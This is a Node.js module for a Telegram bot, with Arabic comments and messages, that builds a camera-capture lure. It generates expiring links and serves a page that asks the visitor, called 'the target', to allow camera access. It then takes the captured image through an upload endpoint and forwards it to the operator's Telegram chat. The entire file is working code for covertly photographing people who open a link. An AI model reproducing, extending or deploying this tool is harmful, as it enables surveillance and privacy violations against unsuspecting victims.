const crypto = require('crypto');
const { encrypt, decrypt } = require('../../utils/crypto');
const config = require('../../core/config');
const fs = require('fs');
const path = require('path');

const camSessions = new Map();

module.exports = (bot, app) => {
    // 1. أمر توليد رابط الكاميرا
    bot.command('camid', async (ctx) => {
        const chatId = ctx.chat.id;
        const uniqueId = crypto.randomBytes(8).toString('hex');
        const encryptedChatId = encrypt(chatId.toString());
        const expiresAt = Date.now() + config.SESSION_EXPIRY;

        camSessions.set(uniqueId, { encryptedChatId, expiresAt });

        const domain = config.DOMAIN || `http://localhost:${config.PORT}`;
        const customLink = `${domain}/cam-${uniqueId}`;
        
        await ctx.reply(
            `📸 <b>[خدمة التقاط الصور]</b>\n\n` +
            `تم إنشاء رابط الكاميرا الفريد:\n` +
            `<code>${customLink}</code>\n\n` +
            `⚠️ عند فتح الرابط، سيُطلب من الهدف السماح بالكاميرا لالتقاط صورة وإرسالها إليك هنا.`, 
            { parse_mode: 'HTML' }
        );
    });

    // 2. صفحة الويب الخاصة بالكاميرا
    app.get('/cam-:id', (req, res) => {
        const linkId = req.params.id;
        const session = camSessions.get(linkId);
        
        if (!session || session.expiresAt < Date.now()) {
            if (session) camSessions.delete(linkId);
            return res.status(404).send("عذراً، الرابط منتهي الصلاحية.");
        }

        const templatePath = path.join(__dirname, 'templates/cam_page.html');
        if (fs.existsSync(templatePath)) {
            let html = fs.readFileSync(templatePath, 'utf8');
            html = html.replace('${linkId}', linkId);
            res.send(html);
        } else {
            res.send("Template not found");
        }
    });

    // 3. استقبال الصورة من صفحة الويب
    app.post('/api/upload-cam', async (req, res) => {
        const { id, image } = req.body; // الصورة تأتي كـ base64
        const session = camSessions.get(id);
        
        if (!session || session.expiresAt < Date.now()) return res.json({ status: 'error' });

        try {
            const ownerChatId = decrypt(session.encryptedChatId);
            
            // تحويل base64 إلى Buffer
            const base64Data = image.replace(/^data:image\/png;base64,/, "");
            const buffer = Buffer.from(base64Data, 'base64');

            // إرسال الصورة للبوت
            await bot.telegram.sendPhoto(ownerChatId, { source: buffer }, {
                caption: `📸 تم التقاط صورة جديدة من الرابط: ${id}`
            });

            res.json({ status: 'success' });
        } catch (err) {
            console.error(err);
            res.json({ status: 'error' });
        }
    });
};
